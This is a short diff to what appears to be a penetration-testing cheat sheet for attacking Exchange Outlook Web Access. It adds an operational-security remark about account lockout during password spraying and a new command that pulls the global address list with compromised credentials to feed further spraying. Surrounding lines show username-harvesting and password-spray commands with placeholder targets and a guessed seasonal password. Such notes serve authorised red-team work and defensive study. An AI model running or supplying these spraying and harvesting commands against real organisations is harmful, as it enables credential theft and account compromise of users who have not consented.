@@ -39,8 +39,15 @@ Invoke-UsernameHarvestOWA -ExchHostname <IP> -Domain <DOMAIN> -UserList .\possib
 ```
 
 #### Passwors spray
+- OPSEC: In the real world, be aware that these authentication attempts may count towards the domain lockout policy for the users. Too many attempts in a short space of time is not only loud, but may also lock accounts out.
 ```
 Invoke-PasswordSprayOWA -ExchHostname <IP> -UserList .\domain_users.txt -Password Summer2021
+```
+
+#### Download global adress list
+- Get more emails, and maybe spray again!
+```
+Get-GlobalAddressList -ExchHostname <IP> -UserName <DOMAIN>\<USER> -Password <PASSWORD> -OutFile gal.txt
 ```
 
 # From the inside
